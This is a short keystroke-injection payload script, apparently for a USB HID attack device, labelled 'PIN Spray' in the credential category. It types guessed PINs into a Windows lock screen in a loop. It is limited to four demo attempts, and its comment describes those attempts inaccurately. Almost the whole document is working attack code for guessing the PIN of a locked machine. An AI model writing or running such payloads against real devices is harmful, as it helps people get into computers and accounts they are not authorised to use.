NAME PIN Spray
DESCRIPTION Tries common 4-digit PINs on lock screen using FOR loop
CATEGORY credential
PLATFORMS WIN
OPTION DELAY 1000 "Delay between attempts (ms)"
PLATFORM WIN
DELAY 1500
PRINT Starting PIN spray...
LED_COLOR YELLOW
REM Try PINs 0000-0003 as demo (safety: only 4 attempts)
FOR $I = 0 TO 3
  PRINT Trying PIN $I...
  STRING $I$I$I$I
  ENTER
  DELAY {{DELAY}}
END_FOR
LED_COLOR GREEN
PRINT PIN spray complete
